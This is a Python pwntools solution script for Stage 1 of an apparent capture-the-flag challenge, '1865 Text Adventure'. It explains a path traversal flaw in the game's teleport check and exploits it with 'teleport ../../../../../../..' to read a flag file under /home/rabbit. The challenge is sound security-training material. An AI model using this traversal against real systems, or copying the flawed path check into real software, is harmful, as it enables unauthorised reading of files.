#!/usr/bin/env python

'''
1865 Text Adventure
Solution for Stage 1

The first vulnerability relies on the following:

* The story tree is implemented in the form of directories and files.

* The TeleportCommand allows the user to move to a new location relative to the STORIES_DIR via the
game.teleport function. It also prevents paths that start with '/' so it will always be in relation
to the STORIES_DIR.

    def run(self, args):
        ...
        for i in args[1].strip().split('/'):
            if i == '':
                letterwise_print('Cannot travel through empty rooms. Pay attention to this!')
                return
        rel_path = STORIES_DIR / args[1]
        if rel_path.exists() and rel_path.is_dir():
            self.game.teleport(rel_path)
            return

* The string .. will pass the check. So will ../../../../..

* The teleport function will check if the resolved location is a directory.

    def teleport(self, next_location, add_history=True):
        path = pathlib.Path(next_location)
        if not path.is_dir():
            # We cannot proceed.
            letterwise_print("Cannot move to '{}'.".format(next_location))
            return
        # Make the move.
        if add_history:
            self.history.append(self.location)
        self.location = path
        letterwise_print("You have moved to a new location: '{}'.\n".format(self.location.name))
        self.get_command('look').run(['look'])

* The teleport command is granted only when the looking-glass is picked up.
'''

from pwn import *
from common import Common


def main():
    # Get the connection.
    c = Common.get_connection()
    c.init_connection()

    # Move to the a-shallow-deadend to get the pocket-watch.
    # This pocket-watch allows us to turn off text scrolling.
    log.info('Moving to the a-shallow-deadend to get the pocket-watch...')
    c.move(b'a-shallow-deadend')
    c.get(b'pocket-watch')
    log.info('Disabling text scroll.')
    c.sendline(b'options text_scroll f')
    c.back()

    # Move to the a-curious-hall and drink the pink-bottle.
    log.info('Moving to a-curious-hall to drink the pink-bottle...')
    next_path = [b'deeper-into-the-burrow', b'a-curious-hall', b'a-curious-hall']
    c.multimove(next_path)
    c.get(b'pink-bottle')

    # Move to the a-fancy-pavillion and eat the fluffy-cake.
    log.info('Moving to a-fancy-pavillion to eat the fluffy-cake...')
    next_path = [b'a-pink-door', b'maze-entrance', b'knotted-boughs', b'dazzling-pines',
                 b'a-pause-in-the-trees', b'confusing-knot', b'green-clearing',
                 b'a-fancy-pavillion']
    c.multimove(next_path)
    c.get(b'fluffy-cake')

    # Move to a-mystical-cove to get the looking-glass.
    log.info('Moving to a-mystical-cove to get the looking-glass...')
    next_path = [b'along-the-rolling-waves', b'a-sandy-shore', b'a-mystical-cove', ]
    c.multimove(next_path)
    c.get(b'looking-glass')

    # Trigger the path traversal to get to the root.
    log.info('Triggering path traversal vulnerability to navigate to /')
    c.sendline('teleport ../../../../../../..')

    # Move to /home/rabbit/
    log.info('Moving to /home/rabbit')
    next_path = [b'home', b'rabbit']
    c.multimove(next_path)

    # Get the flag.
    log.info('Reading the flag at /home/rabbit/flag1')
    flag1 = c.read(b'flag1')
    log.success('Flag 1:')
    log.success(flag1.decode('ascii'))

    # Quit gracefully.
    c.exit()


if __name__ == '__main__':
    main()
